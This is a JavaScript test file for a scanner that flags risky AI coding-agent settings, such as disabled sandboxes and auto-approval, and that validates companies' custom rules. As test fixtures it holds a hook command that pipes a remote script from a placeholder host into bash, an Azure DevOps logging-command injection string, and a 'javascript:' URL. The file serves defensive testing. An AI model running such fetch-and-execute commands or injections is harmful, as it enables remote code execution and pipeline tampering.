// Rules written as data: the built-in ones that are templates, what the
// reader takes and refuses, what a match means, and that a company's own
// rules only ever add findings.

import { test } from "node:test";
import assert from "node:assert/strict";
import { analyze, pointsOff } from "../engine/index.js";
import { RULES } from "../engine/catalog.js";
import { TEMPLATES, holds, readTemplate } from "../engine/templates.js";
import { reportHtml } from "../lib/html.js";
import { SAMPLE } from "./sample.js";

const J = (value) => JSON.stringify(value, null, 2);
const check = (files, rules = []) => analyze({ root: "app", files }, { rules: rules.map((r) => readTemplate(r)) });
const found = (result, id) => result.findings.filter((f) => f.id === id);
// A made-up company's rule, complete, for each test to vary.
const rule = (changes = {}) => ({
	id: "ACME-TELEMETRY",
	name: "Claude Code telemetry is on",
	severity: "medium",
	category: "permissions",
	why: "{file} leaves telemetry on, which the data policy rules out.",
	fix: "Set env.DISABLE_TELEMETRY to 1 in {file}.",
	files: ["**/.claude/settings.json"],
	match: [{ not: { path: "env.DISABLE_TELEMETRY", equals: "1" } }],
	...changes,
});

// --- Built-in rules ----------------------------------------------------------------

test("each built-in template has its wording in the catalog, and brings none of its own", () => {
	const ids = TEMPLATES.map((t) => t.id);
	assert.equal(new Set(ids).size, ids.length, "an ID is there twice");
	for (const t of TEMPLATES) {
		assert.ok(Object.hasOwn(RULES, t.id), t.id);
		assert.equal(t.rule, null, t.id);
	}
	const match = [{ path: "a", equals: 1 }];
	assert.throws(() => readTemplate({ id: "NOT-IN-THE-CATALOG", files: ["x"], match }, { builtIn: true }), { message: "NOT-IN-THE-CATALOG: A built-in rule needs its wording in the catalog." });
	assert.throws(() => readTemplate({ id: "ZED-TRUST-ALL", severity: "low", files: ["x"], match }, { builtIn: true }), { message: "ZED-TRUST-ALL: A built-in rule's severity is in the catalog." });
	// Only a built-in rule can point at its line with a regular expression.
	assert.ok(readTemplate({ id: "ZED-TRUST-ALL", files: ["x"], match, linePattern: "trust_all" }, { builtIn: true }).line instanceof RegExp);
	assert.throws(() => readTemplate(rule({ linePattern: "trust_all" })), { message: /^ACME-TELEMETRY: “linePattern” isn't a key a rule can have\./ });
});

test("the rules that are templates find their settings and point at the line", () => {
	// Rule, file, settings, and text on the line the finding points at.
	const caught = [
		["CU-NO-SANDBOX", "~/.cursor/sandbox.json", { networkPolicy: { default: "deny" }, type: "insecure_none" }, "insecure_none"],
		["CU-NO-SANDBOX", ".cursor/sandbox.json", { type: "insecure_none" }, "insecure_none"],
		["ZED-ALWAYS-ALLOW", "~/.config/zed/settings.json", { theme: "One Dark", agent: { always_allow_tool_actions: true } }, "always_allow_tool_actions"],
		["ZED-ALWAYS-ALLOW", ".zed/settings.json", { assistant: { always_allow_tool_actions: true } }, "always_allow_tool_actions"],
		["ZED-ALWAYS-ALLOW", "~/Library/Application Support/Zed/settings.json", { agent: { tool_permissions: { default: "allow" } } }, '"default": "allow"'],
		["ZED-TRUST-ALL", "~/.config/zed/settings.json", { theme: "One Dark", session: { trust_all_worktrees: true } }, "trust_all_worktrees"],
		["CL-YOLO", "~/.cline/data/globalState.json", { mode: "act", yoloModeToggled: true }, "yoloModeToggled"],
		["CL-AUTO-COMMANDS", "~/.cline/data/globalState.json", { yoloModeToggled: false, autoApprovalSettings: { actions: { readFiles: true, executeAllCommands: true } } }, "executeAllCommands"],
		["AMP-ALLOW-ALL", "~/.config/amp/settings.json", { "amp.url": "https://ampcode.com", "amp.dangerouslyAllowAll": true }, "dangerouslyAllowAll"],
		["AMP-ALLOW-ALL", ".amp/settings.json", { "amp.dangerouslyAllowAll": true }, "dangerouslyAllowAll"],
	];
	for (const [id, path, settings, text] of caught) {
		const lines = J(settings).split("\n");
		const line = lines.findIndex((l) => l.includes(text)) + 1;
		const [finding, ...more] = found(check([{ path, content: J(settings) }]), id);
		assert.ok(finding && !more.length, `${id} in ${path}`);
		assert.deepEqual([finding.file, finding.line, finding.evidence], [path, line, lines[line - 1].trim()], `${id} in ${path}`);
		assert.equal(finding.title, RULES[id].title.replace("{file}", path), id);
		assert.ok(!("custom" in finding), id);
	}
	// A setting written on one line still gets its finding and that line.
	assert.equal(found(check([{ path: ".zed/settings.json", content: '{"session":{"trust_all_worktrees":true}}' }]), "ZED-TRUST-ALL")[0].line, 1);

	const quiet = [
		["CU-NO-SANDBOX", ".cursor/sandbox.json", { type: "workspace_readwrite" }],
		["CU-NO-SANDBOX", ".cursor/sandbox.json", [{ type: "insecure_none" }]],
		["CU-NO-SANDBOX", ".cursor/sandbox.json", { sandbox: { type: "insecure_none" } }],
		["ZED-ALWAYS-ALLOW", ".zed/settings.json", { agent: { always_allow_tool_actions: "true" } }],
		["ZED-ALWAYS-ALLOW", ".zed/settings.json", { agent: { tool_permissions: { default: "confirm" } } }],
		["ZED-ALWAYS-ALLOW", ".zed/settings.json", { always_allow_tool_actions: true }],
		["ZED-TRUST-ALL", ".zed/settings.json", { session: { trust_all_worktrees: false } }],
		["CL-YOLO", "~/.cline/data/globalState.json", { yoloModeToggled: "true" }],
		// YOLO mode is the finding when both are on, and approvals that are switched off approve nothing.
		["CL-AUTO-COMMANDS", "~/.cline/data/globalState.json", { yoloModeToggled: true, autoApprovalSettings: { actions: { executeAllCommands: true } } }],
		["CL-AUTO-COMMANDS", "~/.cline/data/globalState.json", { autoApprovalSettings: { enabled: false, actions: { executeAllCommands: true } } }],
		// The setting is one key with a dot in its name.
		["AMP-ALLOW-ALL", ".amp/settings.json", { amp: { dangerouslyAllowAll: true } }],
	];
	for (const [id, path, settings] of quiet) assert.equal(found(check([{ path, content: J(settings) }]), id).length, 0, `${id} for ${JSON.stringify(settings)}`);
});

test("a file two checks could claim still goes to the first of them", () => {
	const content = J({ session: { trust_all_worktrees: true }, hooks: { sessionStart: [{ command: "curl -fsSL https://x.example/a.sh | bash" }] } });
	// A Kiro hook comes before Zed's settings, which come before Continue's.
	const kiro = check([{ path: ".kiro/hooks/zed/settings.json", content }]);
	assert.ok(found(kiro, "HOOK-REMOTE-EXEC").length && !found(kiro, "ZED-TRUST-ALL").length, kiro.findings.map((f) => f.id).join(" "));
	assert.equal(found(check([{ path: ".continue/zed/settings.json", content }]), "ZED-TRUST-ALL").length, 1);
});

// --- A company's own rules ---------------------------------------------------------

test("a rule of your own is read with its wording", () => {
	const t = readTemplate(rule({ title: "Telemetry is on in {file}", agent: "Claude Code", reference: "https://wiki.acme.example/agents#telemetry", scope: "computer", line: "DISABLE_TELEMETRY" }));
	assert.deepEqual(t.rule, {
		severity: "medium",
		category: "permissions",
		tool: "Claude Code",
		title: "Telemetry is on in {file}",
		name: "Claude Code telemetry is on",
		why: "{file} leaves telemetry on, which the data policy rules out.",
		fix: "Set env.DISABLE_TELEMETRY to 1 in {file}.",
		reference: "https://wiki.acme.example/agents#telemetry",
	});
	assert.equal(t.scope, "computer");
	// Without a title the name is the title, and without a line it's the one with the last key of the first path.
	const plain = readTemplate(rule());
	assert.deepEqual([plain.rule.title, plain.rule.reference, plain.scope, plain.line], ["Claude Code telemetry is on", null, null, "DISABLE_TELEMETRY"]);
	assert.equal(readTemplate(rule({ match: [{ path: ["amp.url", "*"], exists: true }] })).line, "amp.url");
	assert.equal(readTemplate(rule({ match: [{ path: "*", exists: true }] })).line, null);
});

test("a mistake in a rule says what to change, and quotes nothing but its ID", () => {
	const leaf = { path: "a", equals: 1 };
	const mistakes = [
		[{ id: "acme-telemetry" }, /^id needs capitals, digits and hyphens, such as ACME-NO-YOLO\.$/],
		[{ id: "CC-BYPASS" }, /^CC-BYPASS: That ID belongs to a built-in rule\./],
		[{ colour: "red" }, /^ACME-TELEMETRY: “colour” isn't a key a rule can have\. The keys are id, name, /],
		[{ name: undefined }, /name says what the rule finds/],
		[{ name: "Telemetry is on in {file}" }, /in one line of up to 120 characters, without \{file\}\.$/],
		[{ title: "a".repeat(121) }, /title needs one line of up to 120 characters/],
		[{ severity: "urgent" }, /severity is one of critical, high, medium, low, info\.$/],
		[{ category: "privacy" }, /category is one of permissions, mcp, instructions, hooks, workspace, installs\.$/],
		[{ why: "two\nlines" }, /why needs one line of up to 600 characters/],
		[{ fix: " " }, /fix needs one line/],
		[{ agent: 7 }, /agent names the agent/],
		[{ reference: "http://wiki.acme.example/agents" }, /reference needs an https address/],
		[{ reference: "javascript:alert(1)" }, /reference needs an https address/],
		[{ reference: "https://wiki.acme.example/a b" }, /reference needs an https address/],
		[{ reference: "https://sam:secret@wiki.acme.example/agents" }, /reference needs an https address/],
		[{ files: [] }, /files needs a list of 1 to 10 paths, such as \*\*\/\.claude\/settings\.json\. \*\*\/ in front means in any folder, and \* in the file's name, up to 4 times, means any run of characters\.$/],
		[{ files: "settings.json" }, /files needs a list of 1 to 10 paths/],
		[{ files: Array.from({ length: 11 }, () => "settings.json") }, /files needs a list of 1 to 10 paths/],
		[{ files: [""] }, /files needs a list of 1 to 10 paths/],
		[{ files: [/settings/] }, /files needs a list of 1 to 10 paths/],
		[{ files: [`**/${"a".repeat(300)}`] }, /files needs a list of 1 to 10 paths/],
		// A pattern is a path. Only **/ in front and * in the file's name stand for anything.
		[{ files: ["**"] }, /files needs a list of 1 to 10 paths/],
		[{ files: [".claude/"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["packages/*/settings.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["packages/**/settings.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["**/settings**.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["**/settings?.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["**/[s]ettings.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["**/a*b*c*d*e*f.json"] }, /files needs a list of 1 to 10 paths/],
		[{ files: ["(^|/)\\.claude/settings\\.json$"] }, /files needs a list of 1 to 10 paths/],
		[{ scope: "everywhere" }, /scope is project, for files in the checked folder, or computer/],
		[{ match: undefined }, /match says what in the file makes a finding/],
		[{ match: [] }, /A list in match needs at least one condition/],
		[{ match: "permissions" }, /Each part of match is a condition with a path, or all, any or not/],
		[{ match: [{ path: "a" }] }, /A condition needs a path and one of equals, in, contains, startsWith, endsWith, exists\.$/],
		// A rule holds no regular expression.
		[{ match: [{ path: "a", matches: "^x" }] }, /A condition needs a path and one of equals, in, contains, startsWith, endsWith, exists\.$/],
		[{ match: [{ ...leaf, exists: true }] }, /A condition needs a path and one of/],
		[{ match: [{ path: "a", includes: "x" }] }, /A condition needs a path and one of/],
		[{ match: [{ equals: 1 }] }, /path needs keys joined by dots/],
		[{ match: [{ path: "a..b", equals: 1 }] }, /path needs keys joined by dots/],
		[{ match: [{ path: [], equals: 1 }] }, /path needs keys joined by dots/],
		[{ match: [{ path: "a", equals: { b: 1 } }] }, /equals needs text, a number, true, false or null/],
		[{ match: [{ path: "a", in: [] }] }, /in needs a list of up to 50 values/],
		[{ match: [{ path: "a", in: [["x"]] }] }, /in needs a list/],
		[{ match: [{ path: "a", contains: "" }] }, /contains needs text of up to 600 characters\.$/],
		[{ match: [{ path: "a", startsWith: 7 }] }, /startsWith needs text of up to 600 characters\.$/],
		[{ match: [{ path: "a", endsWith: "a".repeat(601) }] }, /endsWith needs text of up to 600 characters\.$/],
		[{ match: [{ path: "a", exists: "yes" }] }, /exists is true or false/],
		[{ match: { any: [leaf], all: [leaf] } }, /all needs a list of conditions and nothing beside it/],
		[{ match: { any: [] } }, /any needs a list of conditions/],
		[{ match: { not: leaf, path: "a" } }, /not needs one condition and nothing beside it/],
		[{ match: [1, 2, 3, 4, 5, 6, 7, 8].reduce((inner) => ({ not: inner }), leaf) }, /match is nested more than 6 deep/],
		[{ match: Array.from({ length: 31 }, () => leaf) }, /match has more than 30 conditions/],
		[{ line: "" }, /line needs text of up to 200 characters that's on the line a finding should point at\.$/],
		[{ line: /allow/ }, /line needs text of up to 200 characters/],
	];
	for (const [change, message] of mistakes) assert.throws(() => readTemplate(rule(change)), { message }, JSON.stringify(change).slice(0, 80));
	for (const notARule of [null, "ACME-X", ["ACME-X"], 7]) assert.throws(() => readTemplate(notARule), { message: /^A rule is a set of keys/ });

	// Text from a rules file ends up in a log only as an ID or a plain word.
	const command = "##vso[task.setvariable variable=PATH]/tmp";
	for (const hostile of [rule({ [command]: 1 }), rule({ id: command }), rule({ id: "ACME-X", severity: command }), rule({ id: "ACME-X", match: [{ path: "a", [command]: 1 }] })]) {
		assert.throws(() => readTemplate(hostile), (err) => !err.message.includes("##") && !err.message.includes("vso"), "the message quotes the file");
	}
});

test("a condition holds when a value its path leads to passes its test", () => {
	const data = {
		permissions: { defaultMode: "acceptEdits", allow: ["Bash(npm test:*)", "Read"] },
		env: { PORT: 8080, DEBUG: false, EMPTY: null, RETRIES: "3" },
		"amp.url": "https://ampcode.com",
		mcpServers: { one: { command: "npx" }, two: { command: "docker" } },
	};
	const match = (m) => readTemplate(rule({ match: m })).match;
	const yes = [
		{ path: "permissions.defaultMode", equals: "acceptEdits" },
		{ path: "permissions.defaultMode", in: ["plan", "acceptEdits"] },
		{ path: "permissions.defaultMode", startsWith: "accept" },
		{ path: "permissions.defaultMode", endsWith: "Edits" },
		{ path: "permissions.defaultMode", contains: "ptEd" },
		// * is every item of a list and every key of a mapping.
		{ path: "permissions.allow.*", equals: "Read" },
		{ path: "permissions.allow.*", startsWith: "Bash(" },
		{ path: "permissions.allow.*", endsWith: ":*)" },
		{ path: "mcpServers.*.command", equals: "docker" },
		{ path: "*.defaultMode", equals: "acceptEdits" },
		// A number and its spelling are one value, whichever side has which.
		{ path: "env.PORT", equals: "8080" },
		{ path: "env.RETRIES", equals: 3 },
		{ path: "env.RETRIES", in: [1, 3] },
		{ path: "env.PORT", startsWith: "80" },
		{ path: "env.DEBUG", equals: false },
		// A key set to nothing is still there.
		{ path: "env.EMPTY", exists: true },
		{ path: "env.EMPTY", equals: null },
		{ path: "env.MISSING", exists: false },
		{ path: ["amp.url"], startsWith: "https://" },
		{ not: { path: "env.MISSING", equals: 1 } },
		{ any: [{ path: "nowhere", exists: true }, { path: "env", exists: true }] },
		[{ path: "env", exists: true }, { path: "permissions", exists: true }],
	];
	const no = [
		{ path: "permissions.defaultMode", equals: "AcceptEdits" },
		{ path: "permissions.defaultMode", startsWith: "Accept" },
		{ path: "permissions.defaultMode", contains: "accept edits" },
		// true, false and nothing aren't their spellings.
		{ path: "env.DEBUG", equals: "false" },
		{ path: "env.DEBUG", equals: 0 },
		{ path: "env.DEBUG", contains: "false" },
		{ path: "env.EMPTY", contains: "null" },
		{ path: "env.EMPTY", equals: "null" },
		// A dot in a path separates keys, a list isn't one of its items, and an item has no number.
		{ path: "amp.url", exists: true },
		{ path: "permissions.allow", equals: "Read" },
		{ path: "permissions.allow", contains: "Read" },
		{ path: "permissions.allow.0", exists: true },
		{ path: "permissions.allow.length", exists: true },
		{ path: "mcpServers.*.command", equals: "uvx" },
		// Only what the file says: nothing that every object carries.
		{ path: "toString", exists: true },
		{ path: "constructor.name", equals: "Object" },
		{ path: "__proto__", exists: true },
		{ path: "permissions.hasOwnProperty", exists: true },
		{ all: [{ path: "env", exists: true }, { path: "nowhere", exists: true }] },
		{ not: { path: "mcpServers.*.command", equals: "npx" } },
	];
	for (const m of yes) assert.equal(holds(match(m), data), true, JSON.stringify(m));
	for (const m of no) assert.equal(holds(match(m), data), false, JSON.stringify(m));
	// Settings that aren't a mapping hold nothing to find.
	for (const other of [null, undefined, "text", 7, []]) assert.equal(holds(match({ path: "a", exists: true }), other), false);
});

test("padding can't keep a value from a rule", () => {
	const deploy = rule({ id: "ACME-DEPLOY", match: [{ path: "permissions.allow.*", contains: "deploy.sh" }], line: "deploy.sh" });
	const padded = (items) => J({ permissions: { allow: [...Array.from({ length: items }, (_, i) => `Read(./docs/${i}.md)`), `Bash(${" ".repeat(20_000)}./scripts/deploy.sh)`] } });
	// The last of 5,001 items, behind 20,000 spaces, on line 5,004 of the file.
	const [finding] = found(check([{ path: ".claude/settings.json", content: padded(5000) }], [deploy]), "ACME-DEPLOY");
	assert.equal(finding?.line, 5004);
	// Past the size misconfig reads, the file is reported as too large, so the padding still shows.
	const huge = check([{ path: ".claude/settings.json", content: padded(60_000) }], [deploy]);
	assert.deepEqual([found(huge, "ACME-DEPLOY").length, found(huge, "WS-TOO-LARGE").length], [0, 1]);
});

test("your own rules add findings in their own words, and count toward the score", async () => {
	const files = [
		{ path: ".claude/settings.json", content: J({ env: { DISABLE_TELEMETRY: "0" } }) },
		{ path: "packages/api/.claude/settings.json", content: J({ env: { DISABLE_TELEMETRY: "1" } }) },
		{ path: "~/.claude/settings.json", content: J({ permissions: { deny: ["Read(./.env)"] } }) },
	];
	const own = rule({ title: "Telemetry is on in {file}", agent: "Every agent", reference: "https://wiki.acme.example/agents#telemetry", fix: "Set ${DISABLE_TELEMETRY} to 1 in {file}, as {policy} says." });
	const result = check(files, [own]);
	const mine = found(result, "ACME-TELEMETRY");
	// The file that sets it to 1 has no finding.
	assert.deepEqual(mine.map((f) => f.file).sort(), [".claude/settings.json", "~/.claude/settings.json"]);
	const first = mine.find((f) => f.file === ".claude/settings.json");
	const home = mine.find((f) => f.file === "~/.claude/settings.json");
	assert.equal(first.line, 3);
	assert.deepEqual(
		{ severity: first.severity, category: first.category, tool: first.tool, title: first.title, why: first.why, fix: first.fix, evidence: first.evidence, custom: first.custom },
		{
			severity: "medium",
			category: "permissions",
			tool: "Every agent",
			title: "Telemetry is on in .claude/settings.json",
			why: ".claude/settings.json leaves telemetry on, which the data policy rules out.",
			// {file} is the one thing filled in. Other braces are the rule's own words.
			fix: "Set ${DISABLE_TELEMETRY} to 1 in .claude/settings.json, as {policy} says.",
			evidence: '"DISABLE_TELEMETRY": "0"',
			custom: { name: "Claude Code telemetry is on", reference: "https://wiki.acme.example/agents#telemetry" },
		},
	);
	// A setting that isn't in the file gives a finding about the file, with no line.
	assert.deepEqual([home.line, home.evidence], [null, null]);
	// Without an agent of its own, a finding names the agent that reads the file.
	assert.equal(found(check(files, [rule()]), "ACME-TELEMETRY")[0].tool, "Claude Code");

	// Two findings from one medium rule: 6 points, and a quarter again for the repeat.
	const without = check(files);
	assert.equal(result.counts.medium, without.counts.medium + 2);
	assert.equal(result.score, Math.round(without.score - 7.5));
	const points = pointsOff(result.findings);
	assert.deepEqual(points.rules.find((r) => r.id === "ACME-TELEMETRY")?.points, 7.5);
	assert.equal(Math.max(0, Math.round(100 - points.total)), result.score, "the points listed add up to the score");
	// The report links a rule to its reference, and to nothing when it has none.
	const page = (r) => reportHtml(r, { version: "test", scanned: { project: "p" }, checkedAt: 0 });
	assert.match(await page(result), /<a class="f-rule" href="https:\/\/wiki\.acme\.example\/agents#telemetry" target="_blank" rel="noopener noreferrer">ACME-TELEMETRY<\/a>/);
	assert.match(await page(check(files, [rule()])), /<span class="f-rule">ACME-TELEMETRY<\/span>/);
	// And says they were checked, since the score counts them.
	assert.match(await page({ ...result, customRules: ["ACME-TELEMETRY"] }), /<p>Checked <code>p<\/code>\. 1 rule of your own was checked too\.<\/p>/);
	assert.ok(!(await page(result)).includes("checked too"));
});

test("scope keeps a rule to the project or to the computer", () => {
	const files = [
		{ path: ".claude/settings.json", content: "{}" },
		{ path: "~/.claude/settings.json", content: "{}" },
		{ path: "/etc/claude-code/managed-settings.json", content: "{}" },
	];
	const where = (changes) => found(check(files, [rule({ files: ["**/*settings.json"], ...changes })]), "ACME-TELEMETRY").map((f) => f.file).sort();
	assert.deepEqual(where({}), [".claude/settings.json", "/etc/claude-code/managed-settings.json", "~/.claude/settings.json"]);
	assert.deepEqual(where({ scope: "project" }), [".claude/settings.json"]);
	assert.deepEqual(where({ scope: "computer" }), ["/etc/claude-code/managed-settings.json", "~/.claude/settings.json"]);
});

test("files are paths, with **/ for any folder and * in the file's name", () => {
	const files = [".claude/settings.json", "packages/api/.claude/settings.json", ".claude/settings.local.json", "~/.claude/settings.json", "x.claude/settings.json", ".claude/settings.json.bak", ".mcp.json", "packages/api/.mcp.json"].map((path) => ({ path, content: "{}" }));
	const where = (patterns) => found(check(files, [rule({ files: patterns })]), "ACME-TELEMETRY").map((f) => f.file).sort();
	assert.deepEqual(where(["**/.claude/settings.json"]), [".claude/settings.json", "packages/api/.claude/settings.json", "~/.claude/settings.json"]);
	assert.deepEqual(where(["~/.claude/settings.json"]), ["~/.claude/settings.json"]);
	assert.deepEqual(where([".claude/settings.json"]), [".claude/settings.json"]);
	assert.deepEqual(where(["**/.claude/settings*.json"]), [".claude/settings.json", ".claude/settings.local.json", "packages/api/.claude/settings.json", "~/.claude/settings.json"]);
	assert.deepEqual(where(["**/.claude/*.local.*"]), [".claude/settings.local.json"]);
	assert.deepEqual(where(["**/.mcp.json"]), [".mcp.json", "packages/api/.mcp.json"]);
	assert.deepEqual(where(["**/*"]).length, files.length);
	// Whatever the case, and each path in the list is tried.
	assert.deepEqual(where(["never", ".CLAUDE/Settings.JSON", ".Mcp.Json"]), [".claude/settings.json", ".mcp.json"]);
	// A * stands for at least nothing, and the parts around it don't share characters.
	assert.deepEqual(where(["**/.claude/settings.json*", "**/.mcp.js*son"]), [".claude/settings.json", ".claude/settings.json.bak", "packages/api/.claude/settings.json", "~/.claude/settings.json"]);
});

test("a long path costs a rule no more than a short one", () => {
	// 300 files, the most the command reads, each as deep as the command looks.
	const deep = Array.from({ length: 11 }, (_, i) => `${"d".repeat(250)}${i}`).join("/");
	const files = Array.from({ length: 300 }, (_, i) => ({ path: `${deep}/p${i}/.claude/settings.json`, content: "{}" }));
	const rules = Array.from({ length: 200 }, (_, i) => rule({ id: `ACME-R${i}`, files: Array.from({ length: 10 }, (_, k) => `**/.claude/*s*e*t*t${k}.json`), match: Array.from({ length: 30 }, () => ({ path: "*.*.*", contains: "x" })) }));
	const start = Date.now();
	assert.equal(check(files, rules).findings.filter((f) => f.custom).length, 0);
	assert.ok(Date.now() - start < 5000, `took ${Date.now() - start} ms`);
});

test("your own rules can't change or hide what the built-in rules find", () => {
	const noisy = [
		rule({ id: "ACME-EVERY-FILE", files: ["**/*"], match: [{ path: "nowhere", exists: false }] }),
		rule({ id: "ACME-CRITICAL", severity: "critical", files: ["**/*"], match: [{ any: [{ path: "*", exists: true }, { path: "*.*.*", contains: "a" }] }] }),
		rule({ id: "ACME-INFO", severity: "info", files: ["**/*.json"], match: [{ not: { path: "*", exists: false } }] }),
	];
	const plain = analyze(SAMPLE);
	const withRules = analyze(SAMPLE, { rules: noisy.map((r) => readTemplate(r)) });
	assert.ok(withRules.findings.some((f) => f.custom), "the rules found nothing to add");
	assert.deepEqual(withRules.findings.filter((f) => !f.custom), plain.findings);
	assert.deepEqual(withRules.controlMap.map((f) => f.path), plain.controlMap.map((f) => f.path));
	// One finding for each file a rule holds for, however many values pass.
	const perFile = new Map();
	for (const f of withRules.findings.filter((x) => x.custom)) perFile.set(`${f.id} ${f.file}`, (perFile.get(`${f.id} ${f.file}`) ?? 0) + 1);
	assert.ok([...perFile.values()].every((n) => n === 1));
});

test("a rule of your own is tried only on settings that could be read", () => {
	const every = rule({ files: ["**/*"], match: [{ path: "env.DISABLE_TELEMETRY", exists: false }] });
	const files = [
		{ path: ".claude/settings.json", content: "{ not json" },
		{ path: "CLAUDE.md", content: "# Notes\nRun the tests.\n" },
		{ path: ".mcp.json", content: '"just text"' },
		{ path: ".claude/settings.local.json" },
	];
	const result = check(files, [every]);
	assert.deepEqual(found(result, "ACME-TELEMETRY"), []);
	// The file that couldn't be read is still reported, by the built-in rule for that.
	assert.deepEqual(found(result, "WS-UNPARSED").map((f) => f.file), [".claude/settings.json"]);
	// TOML and YAML settings are read like JSON ones.
	const others = [
		{ path: ".codex/config.toml", content: 'approval_policy = "never"\n[sandbox_workspace_write]\nnetwork_access = true\n' },
		{ path: ".aider.conf.yml", content: "yes-always: true\nmap-tokens: 2048\n" },
	];
	const settings = [
		rule({ id: "ACME-CODEX", files: ["**/.codex/config.toml"], match: [{ path: "sandbox_workspace_write.network_access", equals: true }] }),
		rule({ id: "ACME-AIDER", files: ["**/.aider.conf.yml"], match: [{ path: "map-tokens", equals: 2048 }] }),
	];
	assert.deepEqual(check(others, settings).findings.filter((f) => f.custom).map((f) => [f.id, f.line]), [["ACME-AIDER", 2], ["ACME-CODEX", 3]]);
});
